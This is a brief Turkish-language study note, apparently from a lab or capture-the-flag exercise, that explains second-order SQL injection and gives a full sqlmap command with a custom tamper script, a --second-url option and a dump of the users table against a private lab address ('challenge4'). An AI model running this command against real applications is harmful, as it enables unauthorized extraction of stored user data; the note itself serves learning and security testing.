SQL payloadını veritabanında bir yerlere enjekte edip oradan sonra başka bir bölgede ortaya çıkmasına denir.

Örnek Senaryo :

kullanıcı adına x şeklinde bir kullanıcı oluşturup kullanıcının bilgilerinin çekildiği bir sql sorgusuna o kullanıcı adını enjekte edilebiliyor.


### SQLmapde bu şekilde kullanılabilir.
--second-url : 
--
URL'e uygulandıktan sonra ziyaret edilmesi gereken URL i belirtir 

```bash
sqlmap --tamper tamper/so-tamper.py 
--url http://10.10.1.134:5000/challenge4/signup 
--data "username=admin&password=asd" 
--second-url http://10.10.1.134:5000/challenge4/notes -p username 
--dbms=sqlite 
--technique=U 
--no-cast -T users --dump